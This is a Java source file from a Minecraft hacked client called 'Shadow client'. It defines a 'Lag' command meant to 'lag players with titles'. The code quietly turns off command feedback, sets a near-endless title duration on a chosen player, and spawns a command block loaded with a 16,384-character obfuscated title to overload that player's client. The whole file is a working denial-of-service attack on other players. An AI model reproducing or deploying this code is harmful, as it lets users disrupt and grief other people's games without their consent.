/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.minecraft.item.ItemStack;
import net.minecraft.util.Identifier;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import net.shadow.client.helper.util.Utils;

import java.util.Objects;

import net.minecraft.item.Item;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.registry.Registry;

public class Lag extends Command {
    public Lag() {
        super("Lag", "lag players with titles", "lag");
    }

    @Override
    public String[] getSuggestions(String fullCommand, String[] args) {
        if (args.length == 1) {
            return Objects.requireNonNull(ShadowMain.client.world).getPlayers().stream().map(abstractClientPlayerEntity -> abstractClientPlayerEntity.getGameProfile().getName()).toList().toArray(String[]::new);
        }
        return super.getSuggestions(fullCommand, args);
    }

    @Override
    public void onExecute(String[] args) {
        if (args.length < 1) {
            error("Please use the format >lag <player>");
            return;
        }
        String target = Utils.Players.completeName(args[0]);
        ShadowMain.client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/gamerule sendCommandFeedback false"));
        ShadowMain.client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/title " + target + " times 0 999999999 0"));
        ShadowMain.client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/gamerule sendCommandFeedback true"));
        Item item = Registry.ITEM.get(new Identifier("command_block"));
        ItemStack stack = new ItemStack(item, 1);
        try {
            stack.setNbt(StringNbtReader.parse("{BlockEntityTag:{Command:\"/title " + target + " title {\\\"text\\\":\\\""+"l".repeat(16384)+"\\\",\\\"obfuscated\\\":true}\",powered:0b,auto:1b,conditionMet:1b}}"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + ShadowMain.client.player.getInventory().selectedSlot, stack));
        message("Place the command block");
    }
}
